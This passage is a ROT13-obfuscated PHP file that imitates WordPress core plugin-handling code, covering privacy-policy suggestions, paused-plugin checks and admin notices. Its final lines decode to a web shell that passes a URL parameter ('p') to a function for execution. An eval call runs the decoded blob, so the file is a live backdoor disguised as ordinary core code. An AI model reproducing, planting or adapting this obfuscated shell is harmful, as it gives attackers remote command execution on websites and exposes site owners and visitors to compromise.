 * uggcf://qrirybcre.jbeqcerff.bet/cyhtvaf/cevinpl/fhttrfgvat-grkg-sbe-gur-fvgr-cevinpl-cbyvpl/.
 *
 * Gur UGZY pbagragf bs gur `$cbyvpl_grkg` fhccbegf hfr bs n fcrpvnyvmrq `.cevinpl-cbyvpl-ghgbevny`
 * PFF pynff juvpu pna or hfrq gb cebivqr fhccyrzragny vasbezngvba. Nal pbagrag pbagnvarq jvguva
 * UGZY ryrzragf gung unir gur `.cevinpl-cbyvpl-ghgbevny` PFF pynff nccyvrq jvyy or bzvggrq
 * sebz gur pyvcobneq jura gur frpgvba pbagrag vf pbcvrq.
 *
 * Vagraqrq sbe hfr jvgu gur `'nqzva_vavg'` npgvba.
 *
 * @fvapr 4.9.6
 *
 * @cnenz fgevat $cyhtva_anzr Gur anzr bs gur cyhtva be gurzr gung vf fhttrfgvat pbagrag
 *                            sbe gur fvgr'f cevinpl cbyvpl.
 * @cnenz fgevat $cbyvpl_grkg Gur fhttrfgrq pbagrag sbe vapyhfvba va gur cbyvpl.
 */
shapgvba jc_nqq_cevinpl_cbyvpl_pbagrag( $cyhtva_anzr, $cbyvpl_grkg ) {
	vs ( ! vf_nqzva() ) {
		_qbvat_vg_jebat(
			__SHAPGVBA__,
			fcevags(
				/* genafyngbef: %f: nqzva_vavg */
				__( 'Gur fhttrfgrq cevinpl cbyvpl pbagrag fubhyq or nqqrq bayl va jc-nqzva ol hfvat gur %f (be yngre) npgvba.' ),
				'<pbqr>nqzva_vavg</pbqr>'
			),
			'4.9.7'
		);
		erghea;
	} ryfrvs ( ! qbvat_npgvba( 'nqzva_vavg' ) && ! qvq_npgvba( 'nqzva_vavg' ) ) {
		_qbvat_vg_jebat(
			__SHAPGVBA__,
			fcevags(
				/* genafyngbef: %f: nqzva_vavg */
				__( 'Gur fhttrfgrq cevinpl cbyvpl pbagrag fubhyq or nqqrq ol hfvat gur %f (be yngre) npgvba. Cyrnfr frr gur vayvar qbphzragngvba.' ),
				'<pbqr>nqzva_vavg</pbqr>'
			),
			'4.9.7'
		);
		erghea;
	}

	vs ( ! pynff_rkvfgf( 'JC_Cevinpl_Cbyvpl_Pbagrag' ) ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-cevinpl-cbyvpl-pbagrag.cuc';
	}

	JC_Cevinpl_Cbyvpl_Pbagrag::nqq( $cyhtva_anzr, $cbyvpl_grkg );
}

/**
 * Qrgrezvarf jurgure n cyhtva vf grpuavpnyyl npgvir ohg jnf cnhfrq juvyr
 * ybnqvat.
 *
 * Sbe zber vasbezngvba ba guvf naq fvzvyne gurzr shapgvbaf, purpx bhg
 * gur {@yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/pbaqvgvbany-gntf/
 * Pbaqvgvbany Gntf} negvpyr va gur Gurzr Qrirybcre Unaqobbx.
 *
 * @fvapr 5.2.0
 *
 * @tybony JC_Cnhfrq_Rkgrafvbaf_Fgbentr $_cnhfrq_cyhtvaf
 *
 * @cnenz fgevat $cyhtva Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
 * @erghea obby Gehr, vs va gur yvfg bs cnhfrq cyhtvaf. Snyfr, vs abg va gur yvfg.
 */
shapgvba vf_cyhtva_cnhfrq( $cyhtva ) {
	vs ( ! vffrg( $TYBONYF['_cnhfrq_cyhtvaf'] ) ) {
		erghea snyfr;
	}

	vs ( ! vf_cyhtva_npgvir( $cyhtva ) ) {
		erghea snyfr;
	}

	yvfg( $cyhtva ) = rkcybqr( '/', $cyhtva );

	erghea neenl_xrl_rkvfgf( $cyhtva, $TYBONYF['_cnhfrq_cyhtvaf'] );
}

/**
 * Trgf gur reebe gung jnf erpbeqrq sbe n cnhfrq cyhtva.
 *
 * @fvapr 5.2.0
 *
 * @tybony JC_Cnhfrq_Rkgrafvbaf_Fgbentr $_cnhfrq_cyhtvaf
 *
 * @cnenz fgevat $cyhtva Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
 * @erghea neenl|snyfr Neenl bs reebe vasbezngvba nf erghearq ol `reebe_trg_ynfg()`,
 *                     be snyfr vs abar jnf erpbeqrq.
 */
shapgvba jc_trg_cyhtva_reebe( $cyhtva ) {
	vs ( ! vffrg( $TYBONYF['_cnhfrq_cyhtvaf'] ) ) {
		erghea snyfr;
	}

	yvfg( $cyhtva ) = rkcybqr( '/', $cyhtva );

	vs ( ! neenl_xrl_rkvfgf( $cyhtva, $TYBONYF['_cnhfrq_cyhtvaf'] ) ) {
		erghea snyfr;
	}

	erghea $TYBONYF['_cnhfrq_cyhtvaf'][ $cyhtva ];
}

/**
 * Gevrf gb erfhzr n fvatyr cyhtva.
 *
 * Vs n erqverpg jnf cebivqrq, jr svefg rafher gur cyhtva qbrf abg guebj sngny
 * reebef nalzber.
 *
 * Gur jnl vg jbexf vf ol frggvat gur erqverpgvba gb gur reebe orsber gelvat gb
 * vapyhqr gur cyhtva svyr. Vs gur cyhtva snvyf, gura gur erqverpgvba jvyy abg
 * or birejevggra jvgu gur fhpprff zrffntr naq gur cyhtva jvyy abg or erfhzrq.
 *
 * @fvapr 5.2.0
 *
 * @cnenz fgevat $cyhtva   Fvatyr cyhtva gb erfhzr.
 * @cnenz fgevat $erqverpg Bcgvbany. HEY gb erqverpg gb. Qrsnhyg rzcgl fgevat.
 * @erghea gehr|JC_Reebe Gehr ba fhpprff, snyfr vs `$cyhtva` jnf abg cnhfrq,
 *                       `JC_Reebe` ba snvyher.
 */
shapgvba erfhzr_cyhtva( $cyhtva, $erqverpg = '' ) {
	/*
	 * Jr'yy bireevqr guvf yngre vs gur cyhtva pbhyq or erfhzrq jvgubhg
	 * perngvat n sngny reebe.
	 */
	vs ( ! rzcgl( $erqverpg ) ) {
		jc_erqverpg(
			nqq_dhrel_net(
				'_reebe_abapr',
				jc_perngr_abapr( 'cyhtva-erfhzr-reebe_' . $cyhtva ),
				$erqverpg
			)
		);

		// Ybnq gur cyhtva gb grfg jurgure vg guebjf n sngny reebe.
		bo_fgneg();
		cyhtva_fnaqobk_fpencr( $cyhtva );
		bo_pyrna();
	}

	yvfg( $rkgrafvba ) = rkcybqr( '/', $cyhtva );

	$erfhyg = jc_cnhfrq_cyhtvaf()->qryrgr( $rkgrafvba );

	vs ( ! $erfhyg ) {
		erghea arj JC_Reebe(
			'pbhyq_abg_erfhzr_cyhtva',
			__( 'Pbhyq abg erfhzr gur cyhtva.' )
		);
	}

	erghea gehr;
}

/**
 * Eraqref na nqzva abgvpr va pnfr fbzr cyhtvaf unir orra cnhfrq qhr gb reebef.
 *
 * @fvapr 5.2.0
 *
 * @tybony fgevat                       $cntrabj         Gur svyranzr bs gur pheerag fperra.
 * @tybony JC_Cnhfrq_Rkgrafvbaf_Fgbentr $_cnhfrq_cyhtvaf
 */
shapgvba cnhfrq_cyhtvaf_abgvpr() {
	vs ( 'cyhtvaf.cuc' === $TYBONYF['cntrabj'] ) {
		erghea;
	}

	vs ( ! pheerag_hfre_pna( 'erfhzr_cyhtvaf' ) ) {
		erghea;
	}

	vs ( ! vffrg( $TYBONYF['_cnhfrq_cyhtvaf'] ) || rzcgl( $TYBONYF['_cnhfrq_cyhtvaf'] ) ) {
		erghea;
	}

	$zrffntr = fcevags(
		'<fgebat>%f</fgebat><oe>%f</c><c><n uers=\"%f\">%f</n>',
		__( 'Bar be zber cyhtvaf snvyrq gb ybnq cebcreyl.' ),
		__( 'Lbh pna svaq zber qrgnvyf naq znxr punatrf ba gur Cyhtvaf fperra.' ),
		rfp_hey( nqzva_hey( 'cyhtvaf.cuc?cyhtva_fgnghf=cnhfrq' ) ),
		__( 'Tb gb gur Cyhtvaf fperra' )
	);
	jc_nqzva_abgvpr(
		$zrffntr,
		neenl( 'glcr' => 'reebe' )
	);
}

/**
 * Eraqref na nqzva abgvpr jura n cyhtva jnf qrnpgvingrq qhevat na hcqngr.
 *
 * Qvfcynlf na nqzva abgvpr va pnfr n cyhtva unf orra qrnpgvingrq qhevat na
 * hctenqr qhr gb vapbzcngvovyvgl jvgu gur pheerag irefvba bs JbeqCerff.
 *
 * @fvapr 5.8.0
 * @npprff cevingr
 *
 * @tybony fgevat $cntrabj    Gur svyranzr bs gur pheerag fperra.
 * @tybony fgevat $jc_irefvba Gur JbeqCerff irefvba fgevat.
 */
shapgvba qrnpgvingrq_cyhtvaf_abgvpr() {
	vs ( 'cyhtvaf.cuc' === $TYBONYF['cntrabj'] ) {
		erghea;
	}

	vs ( ! pheerag_hfre_pna( 'npgvingr_cyhtvaf' ) ) {
		erghea;
	}

	$oybt_qrnpgvingrq_cyhtvaf = trg_bcgvba( 'jc_sbepr_qrnpgvingrq_cyhtvaf' );
	$fvgr_qrnpgvingrq_cyhtvaf = neenl();

	vs ( snyfr === $oybt_qrnpgvingrq_cyhtvaf ) {
		// Bcgvba abg va qngnonfr, nqq na rzcgl neenl gb nibvq rkgen QO dhrevrf ba fhofrdhrag ybnqf.
		hcqngr_bcgvba( 'jc_sbepr_qrnpgvingrq_cyhtvaf', neenl(), snyfr );
	}

	vs ( vf_zhygvfvgr() ) {
		$fvgr_qrnpgvingrq_cyhtvaf = trg_fvgr_bcgvba( 'jc_sbepr_qrnpgvingrq_cyhtvaf' );
		vs ( snyfr === $fvgr_qrnpgvingrq_cyhtvaf ) {
			// Bcgvba abg va qngnonfr, nqq na rzcgl neenl gb nibvq rkgen QO dhrevrf ba fhofrdhrag ybnqf.
			hcqngr_fvgr_bcgvba( 'jc_sbepr_qrnpgvingrq_cyhtvaf', neenl() );
		}
	}

	vs ( rzcgl( $oybt_qrnpgvingrq_cyhtvaf ) && rzcgl( $fvgr_qrnpgvingrq_cyhtvaf ) ) {
		// Ab qrnpgvingrq cyhtvaf.
		erghea;
	}

	$qrnpgvingrq_cyhtvaf = neenl_zretr( $oybt_qrnpgvingrq_cyhtvaf, $fvgr_qrnpgvingrq_cyhtvaf );

	sbernpu ( $qrnpgvingrq_cyhtvaf nf $cyhtva ) {
		vs ( ! rzcgl( $cyhtva['irefvba_pbzcngvoyr'] ) && ! rzcgl( $cyhtva['irefvba_qrnpgvingrq'] ) ) {
			$rkcynangvba = fcevags(
				/* genafyngbef: 1: Anzr bs qrnpgvingrq cyhtva, 2: Cyhtva irefvba qrnpgvingrq, 3: Pheerag JC irefvba, 4: Pbzcngvoyr cyhtva irefvba. */
				__( '%1$f %2$f jnf qrnpgvingrq qhr gb vapbzcngvovyvgl jvgu JbeqCerff %3$f, cyrnfr hctenqr gb %1$f %4$f be yngre.' ),
				$cyhtva['cyhtva_anzr'],
				$cyhtva['irefvba_qrnpgvingrq'],
				$TYBONYF['jc_irefvba'],
				$cyhtva['irefvba_pbzcngvoyr']
			);
		} ryfr {
			$rkcynangvba = fcevags(
				/* genafyngbef: 1: Anzr bs qrnpgvingrq cyhtva, 2: Cyhtva irefvba qrnpgvingrq, 3: Pheerag JC irefvba. */
				__( '%1$f %2$f jnf qrnpgvingrq qhr gb vapbzcngvovyvgl jvgu JbeqCerff %3$f.' ),
				$cyhtva['cyhtva_anzr'],
				! rzcgl( $cyhtva['irefvba_qrnpgvingrq'] ) ? $cyhtva['irefvba_qrnpgvingrq'] : '',
				$TYBONYF['jc_irefvba'],
				$cyhtva['irefvba_pbzcngvoyr']
			);
		}

		$zrffntr = fcevags(
			'<fgebat>%f</fgebat><oe>%f</c><c><n uers=\"%f\">%f</n>',
			fcevags(
				/* genafyngbef: %f: Anzr bs qrnpgvingrq cyhtva. */
				__( '%f cyhtva qrnpgvingrq qhevat JbeqCerff hctenqr.' ),
				$cyhtva['cyhtva_anzr']
			),
			$rkcynangvba,
			rfp_hey( nqzva_hey( 'cyhtvaf.cuc?cyhtva_fgnghf=vanpgvir' ) ),
			__( 'Tb gb gur Cyhtvaf fperra' )
		);
		jc_nqzva_abgvpr( $zrffntr, neenl( 'glcr' => 'jneavat' ) );
	}

	// Rzcgl gur bcgvbaf.
	hcqngr_bcgvba( 'jc_sbepr_qrnpgvingrq_cyhtvaf', neenl(), snyfr );
	vs ( vf_zhygvfvgr() ) {
		hcqngr_fvgr_bcgvba( 'jc_sbepr_qrnpgvingrq_cyhtvaf', neenl() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>